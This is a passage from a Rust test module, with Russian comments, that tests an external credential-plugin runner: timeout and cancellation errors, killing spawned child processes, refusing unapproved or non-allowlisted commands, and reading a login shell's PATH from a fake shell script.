            let err = go(&e, Duration::from_millis(300)).await.unwrap_err();
            assert_eq!(
                (err.code, err.key.as_str()),
                (ErrorCode::Timeout, "errors.exec.timeout")
            );
            let (tx, cancel) = oneshot::channel();
            let waiting = tokio::spawn({
                let e = e.clone();
                async move { run(&e, "{}", None, cancel, Duration::from_secs(60)).await }
            });
            tokio::time::sleep(Duration::from_millis(100)).await;
            tx.send(()).unwrap();
            let err = waiting.await.unwrap().unwrap_err();
            assert_eq!(err.key, "errors.oauth.cancelled");
            assert!(
                started.elapsed() < Duration::from_secs(10),
                "процесс не ждали"
            );
        }

        /// Процессы, которые запустил плагин, завершаются вместе с ним — и по таймауту, и по отмене.
        #[tokio::test]
        async fn timeout_and_cancel_stop_the_whole_process_group() {
            /// pid фонового процесса, который записал плагин.
            async fn started(pid_file: &Path) -> libc::pid_t {
                let read = async {
                    loop {
                        if let Some(pid) = std::fs::read_to_string(pid_file)
                            .ok()
                            .and_then(|t| t.trim().parse().ok())
                        {
                            return pid;
                        }
                        tokio::time::sleep(Duration::from_millis(20)).await;
                    }
                };
                tokio::time::timeout(Duration::from_secs(10), read)
                    .await
                    .expect("плагин записал pid")
            }
            async fn gone(pid: libc::pid_t) {
                // SAFETY: kill с сигналом 0 только проверяет, есть ли процесс.
                let alive = || unsafe { libc::kill(pid, 0) } == 0;
                let stopped = async {
                    while alive() {
                        tokio::time::sleep(Duration::from_millis(20)).await;
                    }
                };
                tokio::time::timeout(Duration::from_secs(5), stopped)
                    .await
                    .expect("процесс, запущенный плагином, завершён");
            }
            let dir = tempfile::tempdir().unwrap();
            let pid_file = dir.path().join("pid");
            let mut e = plugin(dir.path(), "orphan");
            e.env.push(ExecEnv {
                name: "PID_FILE".into(),
                value: pid_file.display().to_string(),
            });
            let timed_out = tokio::spawn({
                let e = e.clone();
                async move { go(&e, Duration::from_secs(3)).await }
            });
            let pid = started(&pid_file).await;
            let err = timed_out.await.unwrap().unwrap_err();
            assert_eq!(err.key, "errors.exec.timeout");
            gone(pid).await;

            std::fs::remove_file(&pid_file).unwrap();
            let (tx, cancel) = oneshot::channel();
            let waiting = tokio::spawn({
                let e = e.clone();
                async move { run(&e, "{}", None, cancel, Duration::from_secs(60)).await }
            });
            let pid = started(&pid_file).await;
            tx.send(()).unwrap();
            assert_eq!(
                waiting.await.unwrap().unwrap_err().key,
                "errors.oauth.cancelled"
            );
            gone(pid).await;
        }

        #[tokio::test]
        async fn unapproved_or_foreign_command_is_not_started() {
            let dir = tempfile::tempdir().unwrap();
            let mut p = crate::storage::profile::sample_profile("a");
            let mut e = plugin(dir.path(), "ok");
            p.auth = AuthConfig::Exec(e.clone());
            let (_keep, cancel) = oneshot::channel();
            let err = credential_for(&p, cancel, Duration::from_secs(10))
                .await
                .unwrap_err();
            assert_eq!(err.key, "errors.exec.notApproved");
            e.approved = Some(fingerprint(&e));
            p.auth = AuthConfig::Exec(e.clone());
            let (_keep, cancel) = oneshot::channel();
            assert!(
                credential_for(&p, cancel, Duration::from_secs(10))
                    .await
                    .is_ok()
            );
            // Профиль поправили вручную: команда не из списка не запускается.
            let sh = ExecAuth {
                command: "/bin/sh".into(),
                args: vec!["-c".into(), "echo".into()],
                ..e
            };
            let err = go(&sh, Duration::from_secs(10)).await.unwrap_err();
            assert_eq!(err.key, "errors.exec.notAllowed");
        }

        #[tokio::test]
        async fn login_shell_path_between_markers() {
            use std::os::unix::fs::PermissionsExt;
            let dir = tempfile::tempdir().unwrap();
            let shell = dir.path().join("fake-shell");
            std::fs::write(
                &shell,
                "#!/bin/sh\necho 'motd from profile'\nprintf '__GLAFIRA_PATH__/a/bin:/b__GLAFIRA_PATH__'\n",
            )
            .unwrap();
            std::fs::set_permissions(&shell, std::fs::Permissions::from_mode(0o755)).unwrap();
            assert_eq!(
                shell_path(&shell, Duration::from_secs(5)).await.as_deref(),
                Some("/a/bin:/b")
            );
            assert_eq!(
                shell_path(Path::new("/no/such/shell"), Duration::from_secs(5)).await,
                None
            );
        }
    }
}
